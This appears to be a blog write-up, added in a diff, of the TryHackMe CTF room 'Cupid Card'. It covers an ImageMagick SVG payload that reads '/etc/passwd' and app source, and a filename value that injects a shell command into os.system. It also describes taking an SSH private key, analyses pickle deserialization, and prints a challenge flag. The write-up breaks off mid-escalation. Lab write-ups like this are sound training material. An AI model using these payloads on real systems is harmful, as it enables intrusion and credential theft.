@@ -1,0 +1,1089 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Notes and write-ups by humbledragon669">
+      
+      
+        <meta name="author" content="janekpstudentad">
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/user_logo.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Cupid Card - Offense, Defense, and Everything Between</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="purple" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cupid-card" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="Offense, Defense, and Everything Between" class="md-header__button md-logo" aria-label="Offense, Defense, and Everything Between" data-md-component="logo">
+      
+  <img src="../../../../assets/user_logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Offense, Defense, and Everything Between
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cupid Card
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Offense, Defense, and Everything Between" class="md-nav__button md-logo" aria-label="Offense, Defense, and Everything Between" data-md-component="logo">
+      
+  <img src="../../../../assets/user_logo.png" alt="logo">
+
+    </a>
+    Offense, Defense, and Everything Between
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hackviser/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hackviser Scenarios and Labs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hack The Box
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hack The Box
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hackthebox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Coming Soon
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackMe
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackMe
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rooms
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Love at First Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../msc/msc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-foothold-lfi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial foothold - LFI
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-compromise-enumeration-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Post compromise enumeration #1
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation - Command Injection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-compromise-enumeration-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Post compromise enumeration #2
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#horizontal-privilege-escalation-object-deserialisation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Horizontal privilege escalation (object deserialisation)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vertical-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vertical privilege escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:boot2root" class="md-tag">boot2root</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:command-injection" class="md-tag">command-injection</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:ctf" class="md-tag">ctf</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:hard" class="md-tag">hard</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:insecure-deserialization" class="md-tag">insecure-deserialization</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:lfi" class="md-tag">lfi</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:python" class="md-tag">python</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:scripting" class="md-tag">scripting</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:shared-library" class="md-tag">shared-library</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:suid-binary" class="md-tag">suid-binary</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="cupid-card">Cupid Card</h1>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> CTF<br />
+<strong>Difficulty:</strong> Hard<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/lafbctf2026-advanced">Love at First Breach 2026 - Advanced Track</a> (Task 3)</p>
+<h2 id="description">Description</h2>
+<p>"Spread the love this Valentine's Day with CupidCards - the web app that lets you create personalised Valentine cards! Upload a photo, add a heartfelt message, and generate a custom card for that special someone."</p>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<p>I generated a list of open ports for more comprehensive enumeration with the following:<br />
+<code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)</code><br />
+This revealed the following open ports:  </p>
+<ul>
+<li>22</li>
+<li>1337</li>
+</ul>
+<p>I ran a full <code>nmap</code> scan to query the services for version information, as well as querying the target system for OS information with <code>nmap -p$ports -A -T4 TARGET_IP_ADDRESS</code>, which revealed the results following:<br />
+<img alt="nmap initial scan" src="initial_nmap_scan.png" />  </p>
+<p>A UDP scan (for the top 1000 ports) didn't uncover anything new.</p>
+<p>I used my go-to <code>ffuf</code> command to enumerate the website pn port 1337:<br />
+<code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code>.  Again, nothing interesting here:<br />
+<img alt="ffuf initial scan" src="ffuf_initial_scan.png" />  </p>
+<p>There was no <code>robots.txt</code> or <code>sitemap.xml</code> file and nothing interesting in the source code. Submitting a genuine image file (as requested on the form) was successful - the <code>POST</code> request is submitted to the <code>generate</code> endpoint where it is allocated an ID. The card is the saved at <code>cards/card_&lt;id&gt;.png</code>, which can be downloaded through the resulting page or rendered within the web browser by navigating directly to it.</p>
+<p>Sending an OPTIONS request to the <code>generator</code> endpoint reveals that the only request methods accepted were <code>OPTIONS</code> and <code>POST</code>. </p>
+<p>Researching possible vulnerabilities for the very small list of software versions I had returned from the <code>nmap</code> scan came up with nothing immediately useful.</p>
+<h2 id="initial-foothold-lfi">Initial foothold - LFI</h2>
+<p>Attempting to upload a file other than an image file (a Python script in this instance) resulted in an error message that the file is the wrong file type. Adding a double extension to the file resulted in an error message that the file name is incorrectly formatted. After performing these basic tests, I opened Burp and sent an ordinary image file to capture the request, with the idea of reattempting a non-image file and using Intercept to change the <code>Content-Type</code> header. This too was unsuccessful. Sending an empty <code>POST</code> request to the <code>generator</code> endpoint resulted in an error message about the lack of an image file in the form.</p>
+<p>Knowing that the web application was running Flask (<code>nmap</code> results showed Werkzeug on the 1337 port), I considered the possibility that server-side template injection (SSTI) might be possible. In the case of Flask, the template management engine is most likely to be Jinja. We can test for SSTI vulnerabilities in form fields using a standard string (<code>{{7*'7'}}</code>) - if this renders on the resulting page as <code>7777777</code>, the vulnerability is confirmed. Navigating to the generated card showed that the special characters had all been stipped out of the form prior to being submitted to the web application. I used the suggested filter bypass techniques from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2">PayloadsAllTheThings</a> but in every instance, all the special characters were stripped away before being rendered to the card. This was the same for XSS payloads, for all fields.</p>
+<p>Attempting directory traversal was also unsuccessful - any use of <code>..\</code> had the <code>..</code> stripped off in the request.</p>
+<p>OK, so at this point I was pretty grumpy. All that enumeration and payload testing and I had exactly nothing. After testing all that front-end functionality, I was only really left with testing the back-end functionality which, based on what I had seen in the enumeration phases, was responsible for generating the image for the card - i.e. taking the image file and text a user provides, putting it all together, and generating a new .png image that can be downloaded. The important distinction here is that Flask, the web framework this web app is running on, doesn't do this - it would require an external library or binary to perform this function. Googling around came up with two strong candidates - Pillow (if looking at actual real-world implementations) or ImageMagick (if looking at known CTF implementations). Of the two, ImageMagick had a particularly well-documented vulnerability set called ImageTragick, which has it's very own <a href="https://imagetragick.com/">web page with example payloads</a>. Attempting to use the .mvg exploit from that page resulted in an incorrect image format message but the .svg exploit generated a different error - failed to generate image (both file formats had to be saved as .png files to satisfy the file type conditions the web app was working with). Examining the exploit code revealed the following line:<br />
+<code>&lt;image xlink:href="https://example.com/image.jpg&amp;quot;|ls &amp;quot;-la" x="0" y="0" height="640px" width="480px"/&gt;</code>  </p>
+<p>Given that the victim machine is unlikely to have any internet access, I wondered if this was the section of the code causing the problem. Knowing what to replace the external URL + command injection payload with required two things:  </p>
+<ul>
+<li>Knowledge of HTML attributes.</li>
+<li>Knowledge of ImageMagick parsing logic.</li>
+</ul>
+<p>For the first, the attribute of note is the <code>xlink:href</code> attribute being used in the exploit. The <code>xlink</code> set of attributes is used to create hyperlinks in XML documents, which can be embedded into SVG files to render external resources as the image source. Further to that, the <code>href</code> part of this attribute is used to specify a URL. So far so good. </p>
+<p>For the second of those points, ImageMagick has its own set of handlers for parsing/converting image files. Given that the victim machine has access only to itself, it would seem sensible to try to read some sort of local file to test the exploit, and seeing as we don't have any definite image files being hosted on the victim system, it's worth considering whether we might be able to read a text file there instead. Like, say, <code>/etc/passwd</code>. Lucky for me, ImageMagick uses one of its handlers to convert plain text files into an image file: <code>text:</code>. With that in mind, I changed that original line to the following:<br />
+<code>&lt;image xlink:href="text:/etc/passwd" x="0" y="0" height="640px" width="480px"/&gt;</code></p>
+<p>To be clear, the intention here is to have ImageMagick convert the <code>/etc/passwd</code> file on the victim machine into an image file and use that image file as the source for the image being used as the data being submitted to the <code>generator</code> endpoint. If successful, the generated card should be an image of the contents of the <code>/etc/passwd</code> file.</p>
+<p><img alt="/etc/passwd contents" src="etc_passwd_contents.png" />  </p>
+<p>Success! The resulting image was a little small so I tweaked the height and width values a bit. The resulting exploit code was as follows:<br />
+<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot;
+&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
+&lt;svg width=&quot;1420px&quot; height=&quot;1800px&quot; version=&quot;1.1&quot;
+xmlns=&quot;http://www.w3.org/2000/svg&quot;
+xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;
+&lt;image xlink:href=&quot;text:app.py[0]&quot;
+x=&quot;0&quot; y=&quot;0&quot; height=&quot;1800px&quot; width=&quot;1420px&quot;/&gt;
+&lt;/svg&gt;
+</code></pre></div></p>
+<h2 id="post-compromise-enumeration-1">Post compromise enumeration #1</h2>
+<p>Alright, so at this point I have the ability to read files on the victim machine, but no ability to perform commands, including the inability to enumerate the system. Even so, there are some common system files we can access to try and obtain information from - all I had to do was update the file path in the exploit code and re-upload it to the <code>generator</code> endpoint.</p>
+<p><strong><code>/etc/passwd</code></strong>
+There were two non-standard users on the system, both of which are enabled for interactive logins:  </p>
+<ul>
+<li>cupid.</li>
+<li>aphrodite.</li>
+</ul>
+<p><strong><code>/proc/self/status</code></strong>
+The app is running as the user "cupid" (UID of 1001).</p>
+<p><strong><code>/proc/self/environ</code></strong>
+Rendered with no content.</p>
+<p><strong><code>/etc/crontab</code></strong>
+Nothing useful here.</p>
+<p><strong><code>/etc/shadow</code></strong>
+Not able to access.</p>
+<p><strong><code>app.py</code></strong>
+The whole file can be viewed using a suffix to the file name (e.g., <code>[0]</code>) - the suffix represents an ImageMagick frame number, which is useful for files that "overflow" a single frame. There is something potentially useful in the 3rd frame (<code>[2]</code> suffix):<br />
+<img alt="Command injection point" src="command_injection_point.png" />  </p>
+<h2 id="exploitation-command-injection">Exploitation - Command Injection</h2>
+<p>There are two components that make this interesting:  </p>
+<ol>
+<li><code>os.system</code> - this Python command executes system commands via a <code>/bin/sh</code> context. It also interprets special characters and whitespace as contextual to the commands being executed.</li>
+<li><code>{filename}</code> - this is left unquoted in the code, which means if we have control of the input that sets the variable, we can gain control of the code execution.</li>
+</ol>
+<p>To understand how this can be exploited, we also need to understand how this <code>os.system</code> command is invoked. In this application, it's invoked for rejected images, and is used to write to the error log. Looking back through the code, there are a couple of ways to force this invocation, one of which is by sending a file name to the web application that does not satisfy the file format requirements.  In order to take advantage of the identified weakness here, we need to be able to manipulate the file name when it is sent to the web app - given that the file is submitted in a form with a <code>POST</code> request, this may be possible using Burp Intercept or Repeater. Let's put all that together.</p>
+<p>By submitting an image to the web app via Burp, we can see that the <code>POST</code> request contains the original filename and stores it in the <code>filename</code> variable:<br />
+<img alt="filename variable" src="filename_variable.png" />  </p>
+<p>OK, great - that means that we have, in theory, control over setting that variable using Intercept or Repeater. So what does that mean for us? Well, we should be able to execute commands by editing that <code>filename</code> value in the request before sending it to the web application. Obviously, there is the issue that we have no output, which means that not only will we not know what the output of the command injection is, we won't know if it works at all. However, if we can redirect the command to a file that we can read, we can just open it in a web browser, and read the contents. To be on the safe side, we'll make sure to write the file to a directory we already know the web application has the ability to write to - the <code>cards</code> directory, and we need to leave some sort of file extension in place to satisfy the file validation logic in the app. With that in mind, we can change the value for the <code>filename</code> variable to:<br />
+<code>test;id&gt;cards/output.txt;#.png</code>  </p>
+<p>Incorporating this into the <code>os.system</code> command, translates as such:<br />
+<code>os.system(f"logger -t cupidcards -p local0.warning Rejected upload: test;id&gt;cards/output.txt;#.png from 10.66.x.x")</code>  </p>
+<p>When this is expanded, this line of code will then be executed, by <code>/bin/sh</code> in the <code>os.system</code> call, as:  </p>
+<ul>
+<li>Print the line <code>Rejected upload: test</code> with the <code>cupidcards</code> tag and the priority level <code>local0.warning</code> to the log file as specified in the web app (this is done with the <code>logger</code> program).  </li>
+<li>The <code>;</code> specifies that the next part of the line is executed as a new command, independent of the <code>logger</code> command.  </li>
+<li>Run <code>id</code> and redirect the output to <code>cards/output.txt</code>.  </li>
+<li>A second <code>;</code> performs the same purpose - the command that follows is treated as independent from its preceeding text. In this case, the text is prefixed with a <code>#</code> so is treated as a comment and ignored.</li>
+</ul>
+<p>Changing the filename in Burp Repeater and forwarding the request returns an error from the web app. Don't panic! This is actually what we were expecting, remember? We needed to trigger the invalid file format workflow in order to take advantage of the vulnerability. Navigating to the <code>cards/output.txt</code> file on the web application reveals that this blind command injection has actually been successful:<br />
+<img alt="Successful command injection" src="successful_command_injection.png" />  </p>
+<h2 id="post-compromise-enumeration-2">Post compromise enumeration #2</h2>
+<p>The first thing I tried at this point was to change the command being executed from a simple <code>id</code> to a basic <code>bash</code> reverse shell back to my attacker machine but this was unsuccessful. No matter, I have a stronger foothold to enumerate from at this point. Time to start looking around. Some basic enumeration of the "cupid" user's home directory finally gets me the first flag in the <code>cup1d.txt</code> file.  </p>
+<details class="success">
+<summary>What is the first user flag?</summary>
+<p>THM{r3_sub_w1th0ut_4ss1gnm3nt_l1k3_l0v3_w1th0ut_c0mm1tm3nt_92837}</p>
+</details>
+<p>Even better, my enumeration turned up an <code>.ssh</code> directory in the "cupid" user's home directory, which also had a private key in it. Using my command injection to <code>cat</code> the file and redirect the output to my <code>output.txt</code> file, I copied the contents to a key file on my attacker machine, changed the permissions and then used it to <code>ssh</code> directly into the target machine. Finally, a shell!</p>
+<p>Enumerating my way around the file system, I found what looked like another web application in development:<br />
+<img alt="/opt contents" src="opt_contents.png" />  </p>
+<p>The app files themselves were all owned by the "aphrodite" owner readable by everyone. There's no way that's a coincidence in a CTF! Examing the <code>hbproto.py</code> file revealed some light obfuscation:</p>
+<div class="highlight"><pre><span></span><code>import struct
+import hashlib
+Αρως = b&#39;\x89HBP&#39;
+Ερωτα = 2
+Φιλία = bytes([112, 105, 99, 107, 108, 101]).decode()
+Καρδιά = bytes([108, 111, 97, 100, 115]).decode()
+Амур = getattr(__import__(Φιλία), Καρδιά)
+
+def verify_header(Любовь):
+    if len(Любовь) &lt; 6:
+        return False
+    return True
+
+def decode_notes(Сердце):
+    if not isinstance(Сердце, bytes):
+        return str(Сердце)
+    try:
+        return Амур(Сердце)
+    except Exception:
+        return None
+
+def encode_notes(Стрела):
+    爱情 = bytes([100, 117, 109, 112, 115]).decode()
+    心跳 = getattr(__import__(Φιλία), 爱情)
+    return 心跳(Стрела)
+</code></pre></div>
+<p>When deobfuscated (I used AI, other methods are available, but this was quickest), this decodes to:<br />
+<div class="highlight"><pre><span></span><code>import struct
+import hashlib
+HEADER = b&#39;\x89HBP&#39;
+VERSION = 2
+MODULE_NAME = &quot;pickle&quot;
+LOAD_FUNC_NAME = &quot;loads&quot;
+pickle_loads = getattr(__import__(MODULE_NAME), LOAD_FUNC_NAME)
+
+def verify_header(data):
+    if len(data) &lt; 6:
+        return False
+    return True
+
+def decode_notes(data):
+    if not isinstance(data, bytes):
+        return str(data)
+    try:
+        return pickle_loads(data)
+    except Exception:
+        return None
+
+def encode_notes(obj):
+    DUMP_FUNC_NAME = &quot;dumps&quot;
+    pickle_dumps = getattr(__import__(MODULE_NAME), DUMP_FUNC_NAME)
+    return pickle_dumps(obj)
+</code></pre></div></p>
+<p>OK, so there's a bit to unpack here, starting with "what is this pickle"? And why was the author of this script so keen to hide its import? The answer to both of those questions can be found in the official <a href="https://docs.python.org/3/library/pickle.html">pickle</a> documentation - <code>pickle</code> is a module that can be used for serializing and deserializing Python objects. It's also known to be insecure - the documentation specifically warns the reader about the possibility of executing malicious code via a pickle object (this might explain the obfuscation - it seems like the author really didn't want anyone to know that <code>pickle</code> was being used). The script itself consists of two main functions:  </p>
+<ul>
+<li>A deserializer (using the <code>pickle.loads</code> function) - <code>decode_notes</code>.  </li>
+<li>A serializer (using the <code>pickle.dumps</code> function) - <code>encode_notes</code>.</li>
+</ul>
+<h2 id="horizontal-privilege-escalation-object-deserialisation">Horizontal privilege escalation (object deserialisation)</h2>
+<p>Insecure deserialization was, until the latest release, considered a serious enough vulnerability to occupy a place in the OWASP Top 10 (it's now incorporated into a broader category of Software and Data Integrity Failures). As such, it's documentation on the subject provides quite a clear picture of what the presence of <code>pickle</code> in this script could mean for this challenge - in a nutshell, if a an attack can control the serialized object being passed to the deserializer, arbitrary code can be executed when it is deserialized, or can even escalate privileges if the deserialized object has a higher level of privileges than the attacker.  </p>
+<p>OK, so all of this is very promising, but how do we actually leverage this? After all, access to the script is limited to read access only - no execution. Well, that script wasn't the only one in the web app folder - there was another called <code>match_engine.py</code>. The <code>main</code> function in this script essentially checks for any files ending in "<code>.love</code>" in a specified directory (<code>/var/spool/heartbreak/inbox</code>) and the runs the <code>process_files</code> function on each of them. The execution flow of the <code>process_files</code> function is as follows:  </p>
+<ul>
+<li>Read raw bytes.</li>
+<li>Deserialize with <code>MessagePack</code>.</li>
+<li>Validate required structure.</li>
+<li>Validate desire length.</li>
+<li>If notes is bytes → call <code>hbproto.decode_notes()</code> (<code>pickle.loads</code>).</li>
+<li>Compute score.</li>
+<li>Log match.</li>
+<li>Write result file.</li>
+<li>Delete original file.</li>
+</ul>
+<p>Alright, so this is good (provided we can write data to that <code>inbox</code> directory). In theory, we can create some sort of malicious pickle file, make sure it's named with a <code>.love</code> extension, save it in the <code>inbox</code> folder, and the <code>match_engine.py</code> script should have it deserialized. There are some other conditions (otherwise the file will simply be deleted!), so let's take a look at those.</p>
+<p>Firstly, the raw bytes of the file will be deserialized with <a href="https://msgpack.org/index.html"><code>MessagePack</code></a>, which is binary serialization format similar to JSON, so the contents of the file will need to be in this format.</p>
+<p>Secondly, the <code>MessagePack</code> content must follow the structure laid out by the web app. The criteria here is that it much be a dictionary object and contain the following keys:  </p>
+<ul>
+<li><code>from</code></li>
+<li><code>to</code></li>
+<li><code>desire</code></li>
+<li><code>compat</code></li>
+</ul>
+<p>Lastly, the value for the <code>desire</code> key must be at least 50 characters long.</p>
+<p>There is one other condition that our crafted <code>pickle</code> object needs to meet - it needs to be in a format that is read as bytes, not as a string, otherwise it will simply be treated as a string, and will not be passed to the desrialization function.</p>
+<p><em>In an ironic twist, all of these conditions are actually laid out in the <code>PROCESSING.md</code> file in the <code>heartbreak</code> folder:</em>
+<img alt="processing.md contents" src="processing_contents.png" />  </p>
